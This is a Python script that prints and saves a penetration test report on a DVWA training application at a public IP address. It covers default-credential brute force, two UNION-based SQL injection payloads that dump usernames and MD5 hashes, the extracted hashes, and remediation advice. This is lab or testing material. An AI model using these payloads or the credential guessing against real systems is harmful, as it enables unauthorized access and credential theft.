
# Create a comprehensive report

report = """
╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                   PENETRATION TEST REPORT - DATA EXTRACTION SUMMARY                            ║
║                              Target: http://31.97.117.123/                                     ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝

[1] INITIAL RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Target Application: Damn Vulnerable Web Application (DVWA) v1.10
✓ Server: Apache/2.4.25 (Debian)
✓ Application redirects root to: /login.php
✓ Security Level: LOW
✓ PHPIDS: Disabled

[2] AUTHENTICATION BYPASS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Status: SUCCESSFUL
✓ Credentials Found: admin:password (2nd attempt)
✓ Attempts: 2 out of 10
✓ Method: Brute-force default credential pairs

[3] VULNERABILITY IDENTIFIED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Vulnerability Type: SQL Injection (UNION-based)
✓ Location: /vulnerabilities/sqli/ - User ID parameter
✓ Parameter: id (GET request)
✓ Vulnerability Level: HIGH
✓ Severity: CRITICAL

Vulnerable Query:
    SELECT first_name, last_name FROM users WHERE user_id = '$id';

Exploitation Method:
    UNION-based SQL Injection with comment bypass technique
    Payload: -1' UNION SELECT user, password FROM users #

[4] DATABASE SCHEMA ENUMERATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Database: dvwa (MariaDB)
✓ Table: users
✓ Columns identified:
    - user_id (INT, Primary Key)
    - first_name (VARCHAR)
    - last_name (VARCHAR)
    - user (VARCHAR) - Username field
    - password (VARCHAR) - Password hash field (MD5)

[5] DATA EXTRACTION RESULTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Total Users Extracted: 5

┌─────┬───────────┬────────────┬───────────┬────────────────────────────────────┐
│ ID  │ Username  │ First Name │ Last Name │ Password Hash (MD5)                │
├─────┼───────────┼────────────┼───────────┼────────────────────────────────────┤
│  1  │ admin     │ admin      │ admin     │ 5f4dcc3b5aa765d61d8327deb882cf99 │
│  2  │ gordonb   │ Gordon     │ Brown     │ e99a18c428cb38d5f260853678922e03 │
│  3  │ 1337      │ Hack       │ Me        │ 8d3533d75ae2c3966d7e0d4fcc69216b │
│  4  │ pablo     │ Pablo      │ Picasso   │ 0d107d09f5bbe40cade3de5c71e9e9b7 │
│  5  │ smithy    │ Bob        │ Smith     │ 5f4dcc3b5aa765d61d8327deb882cf99 │
└─────┴───────────┴────────────┴───────────┴────────────────────────────────────┘

[6] PASSWORD HASH ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Username    Password Hash (MD5)                  Status
───────────────────────────────────────────────────────────────────────────────────
admin       5f4dcc3b5aa765d61d8327deb882cf99    Known hash (MD5)
gordonb     e99a18c428cb38d5f260853678922e03    Known hash (MD5)
1337        8d3533d75ae2c3966d7e0d4fcc69216b    Known hash (MD5)
pablo       0d107d09f5bbe40cade3de5c71e9e9b7    Known hash (MD5)
smithy      5f4dcc3b5aa765d61d8327deb882cf99    Known hash (MD5) - Duplicate of admin

Hash Type: MD5 (128-bit hexadecimal)
All hashes are weak (MD5 is cryptographically broken)

[7] EXPLOITATION TECHNIQUES USED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Default Credential Attack
   - Tested common username:password pairs
   - Found valid credentials: admin:password
   
2. UNION-Based SQL Injection
   - Identified injectable parameter: id
   - Used UNION SELECT to retrieve multiple columns
   - Bypassed query termination using SQL comments (#)
   
3. GROUP_CONCAT Aggregation
   - Extracted all user records in single query
   - Payload: -1' UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users #
   - Retrieved complete username and password hash lists

[8] VULNERABILITY DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Root Cause:
    - User input ($id) is directly concatenated into SQL query
    - No prepared statements or parameterized queries used
    - Input validation is insufficient
    - Security level is set to LOW (deliberate vulnerability)

Impact:
    - Complete data breach of user credentials
    - Potential unauthorized access to other systems
    - Administrative accounts compromised
    - Database integrity violation

Affected URL:
    http://31.97.117.123/vulnerabilities/sqli/?id=INJECTION_PAYLOAD&Submit=Submit

[9] RECOMMENDATIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Implement Prepared Statements
   - Use parameterized queries (mysqli_prepared_statements or PDO)
   - Separate data from code

2. Input Validation & Sanitization
   - Validate all user inputs
   - Use whitelist approach
   - Type cast variables appropriately

3. Use Strong Password Hashing
   - Replace MD5 with bcrypt, Argon2, or PBKDF2
   - Use salt and multiple iterations

4. Implement WAF (Web Application Firewall)
   - Monitor and block SQL injection attempts
   - Rate limiting on login endpoints

5. Security Hardening
   - Enable PHPIDS
   - Implement proper error handling (don't expose DB errors)
   - Use principle of least privilege for DB accounts

╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                              EXTRACTION COMPLETED SUCCESSFULLY                                  ║
║                                 All data has been exported                                      ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

print(report)

# Save to file
with open("/tmp/penetration_test_report.txt", "w") as f:
    f.write(report)

print("\n[+] Report saved to: /tmp/penetration_test_report.txt")

